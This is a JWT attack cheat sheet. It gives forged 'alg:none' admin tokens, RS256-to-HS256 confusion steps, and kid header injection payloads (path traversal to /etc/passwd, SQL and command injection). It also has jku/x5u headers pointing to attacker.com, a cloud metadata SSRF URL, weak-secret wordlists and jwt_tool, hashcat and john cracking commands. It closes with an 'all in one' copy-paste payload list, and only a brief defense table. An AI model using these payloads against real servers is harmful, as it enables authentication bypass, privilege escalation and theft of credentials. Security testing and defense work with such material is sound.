# JWT ATTACKS COMPLETE CHEAT SHEET

## 1. WHAT IS JWT?

JSON Web Token (JWT) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. It is commonly used for authentication and authorization in web applications and APIs.

A JWT consists of three parts separated by dots (`.`):
- **Header**: Contains metadata about the token (algorithm, type).
- **Payload**: Contains claims (user data, permissions, expiry).
- **Signature**: Verifies the token's integrity.

Example:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

---

## 2. JWT STRUCTURE

| Part | Description | Example (Base64Url) |
|------|-------------|---------------------|
| **Header** | Algorithm and token type | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` |
| **Payload** | Claims (user, role, exp, etc.) | `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ` |
| **Signature** | HMAC or RSA signature | `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c` |

**Common Headers:**
```json
{"alg":"HS256","typ":"JWT"}
{"alg":"RS256","typ":"JWT"}
{"alg":"none","typ":"JWT"}
```

**Common Claims:**
```json
{"sub":"1234567890","name":"John Doe","iat":1516239022}
{"user":"admin","role":"admin","exp":1735689600}
```

---

## 3. COMMON JWT ATTACKS

### 3.1 None Algorithm Attack

If the server accepts tokens with `"alg":"none"`, you can forge a token without a signature.

**Header:**
```json
{"alg":"none","typ":"JWT"}
```
Base64Url: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

**Payload:**
```json
{"user":"admin","role":"admin"}
```
Base64Url: `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ`

**Token (empty signature):**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

**Variations:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

---

### 3.2 Algorithm Confusion (RS256 to HS256)

If the server expects RS256 (asymmetric) but you can force it to use HS256 (symmetric), you can sign the token with the public key as the HMAC secret.

**Steps:**
1. Obtain the server's public key (often available at `/jwks.json`, `/.well-known/jwks.json`, or in the token header `jku`).
2. Create a new token with `"alg":"HS256"`.
3. Sign it using the public key as the HMAC secret.

**Header:**
```json
{"alg":"HS256","typ":"JWT"}
```

**Payload:**
```json
{"user":"admin","role":"admin"}
```

**Signature:** HMAC-SHA256 of `header.payload` using the public key as secret.

**Example using jwt_tool:**
```bash
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

---

### 3.3 Kid Header Injection

The `kid` (Key ID) header tells the server which key to use. If not properly sanitized, it can lead to path traversal, SQL injection, or command injection.

**Header with malicious kid:**
```json
{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}
{"alg":"HS256","typ":"JWT","kid":"/dev/null"}
{"alg":"HS256","typ":"JWT","kid":"http://attacker.com/key"}
{"alg":"HS256","typ":"JWT","kid":"|echo 'malicious_key'"}
{"alg":"HS256","typ":"JWT","kid":"1' UNION SELECT 'key'-- -"}
```

**Path Traversal:**
```
../../../../etc/passwd
../../../../dev/null
../../../../proc/self/environ
```

**SQL Injection:**
```
1' UNION SELECT 'secret'--
1' OR '1'='1
1' UNION SELECT 'key' FROM dual--
```

**Command Injection:**
```
|echo 'secret'
;echo 'secret'
`echo 'secret'`
$(echo 'secret')
```

---

### 3.4 JKU / X5U Header Injection

The `jku` (JWK Set URL) and `x5u` (X.509 URL) headers point to a JWK Set or certificate. If you control this URL, you can supply your own key.

**Header:**
```json
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
```

**Attack Steps:**
1. Host a JWKS file on your server with your public key.
2. Set `jku` to your URL.
3. Sign the token with your private key.

**Example JWKS:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
```

---

### 3.5 JWK Header Injection

The `jwk` header can embed a JSON Web Key directly. If the server trusts it, you can sign with your own key.

**Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB",
    "kid": "attacker-key"
  }
}
```

**Note:** The server must be configured to use the embedded JWK. This is less common but possible.

---

### 3.6 Weak Secret Key Brute-Force

If the token uses HS256 and the secret is weak, you can brute-force it offline.

**Tools:**
- `hashcat`
- `john`
- `jwt_tool`

**Hashcat:**
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**John:**
```bash
john --format=HMAC-SHA256 jwt.txt
```

**Common Weak Secrets:**
```
secret
password
123456
admin
jwt
key
secretkey
supersecret
changeme
default
```

**jwt_tool:**
```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

---

### 3.7 Token Expiration and Claim Manipulation

If the signature is not verified or you have the key, you can modify claims.

**Payload modifications:**
```json
{"user":"admin","role":"admin"}
{"user":"admin","exp":9999999999}
{"user":"admin","iat":0,"nbf":0}
{"sub":"admin","is_admin":true}
```

**Steps:**
1. Decode the payload (Base64Url).
2. Modify the JSON.
3. Re-encode and sign (or leave empty if none algorithm).

---

### 3.8 Other Attacks

- **kid SQL Injection:** `kid` used in SQL query without sanitization.
- **kid Command Injection:** `kid` used in system command.
- **Token Sidejacking:** Steal JWT via XSS.
- **JWT in URL:** Leakage via Referer header.
- **No Expiration:** Tokens that never expire.
- **Algorithm Downgrade:** Force HS256 when RS256 expected.
- **Header Parameter Pollution:** Duplicate `alg` headers.

---

## 4. DETECTION PAYLOADS / GENERIC TOKENS

**None Algorithm Tokens:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

**Altered Payload Tokens (signature invalid but test if verified):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.
```

**Kid Injection Payloads:**
```
../../../../etc/passwd
../../../../dev/null
../../../../proc/self/environ
http://attacker.com/key
|echo 'malicious_key'
;echo 'malicious_key'
`echo 'malicious_key'`
$(echo 'malicious_key')
1' UNION SELECT 'key'-- -
1' OR '1'='1
1' UNION SELECT 'key' FROM dual--
```

**JKU / X5U Payloads:**
```
https://attacker.com/jwks.json
https://attacker.com/cert.pem
http://169.254.169.254/latest/meta-data/
http://localhost:8080/jwks.json
```

**Common Weak Secrets List (for brute-force):**
```
secret
password
123456
admin
jwt
key
secretkey
supersecret
changeme
default
qwerty
letmein
root
toor
test
guest
```

---

## 5. TOOLS AND COMMANDS

**jwt_tool:**
```bash
# Decode token
python3 jwt_tool.py <JWT>

# Tamper with payload
python3 jwt_tool.py <JWT> -T

# Crack secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Exploit alg:none
python3 jwt_tool.py <JWT> -X a

# Exploit kid injection
python3 jwt_tool.py <JWT> -X k

# Exploit jku/x5u
python3 jwt_tool.py <JWT> -X s
```

**hashcat:**
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**john:**
```bash
john --format=HMAC-SHA256 jwt.txt
```

**jwt.io:** Online debugger (use with caution).

**Burp Suite Extensions:**
- JWT Editor
- JSON Web Token Attacker

---

## 6. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Use strong secrets** | Use long, random secrets for HS256. |
| **2. Validate algorithms** | Reject `none`, enforce expected algorithm. |
| **3. Validate kid, jku, x5u** | Whitelist allowed values, do not trust user input. |
| **4. Use safe libraries** | Keep JWT libraries updated. |
| **5. Verify signature** | Always verify the signature on the server. |
| **6. Check expiration** | Validate `exp`, `iat`, `nbf`. |
| **7. Use HTTPS** | Prevent token interception. |
| **8. Store tokens securely** | Use HttpOnly cookies, avoid localStorage. |
| **9. Implement token revocation** | For logout and compromise. |
| **10. Monitor for anomalies** | Detect forged tokens. |

---

## 7. ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.
../../../../etc/passwd
../../../../dev/null
../../../../proc/self/environ
http://attacker.com/key
|echo 'malicious_key'
;echo 'malicious_key'
`echo 'malicious_key'`
$(echo 'malicious_key')
1' UNION SELECT 'key'-- -
1' OR '1'='1
1' UNION SELECT 'key' FROM dual--
https://attacker.com/jwks.json
https://attacker.com/cert.pem
http://169.254.169.254/latest/meta-data/
http://localhost:8080/jwks.json
secret
password
123456
admin
jwt
key
secretkey
supersecret
changeme
default
qwerty
letmein
root
toor
test
guest
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T
python3 jwt_tool.py <JWT> -C -d wordlist.txt
python3 jwt_tool.py <JWT> -X a
python3 jwt_tool.py <JWT> -X k
python3 jwt_tool.py <JWT> -X s
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john --format=HMAC-SHA256 jwt.txt
```
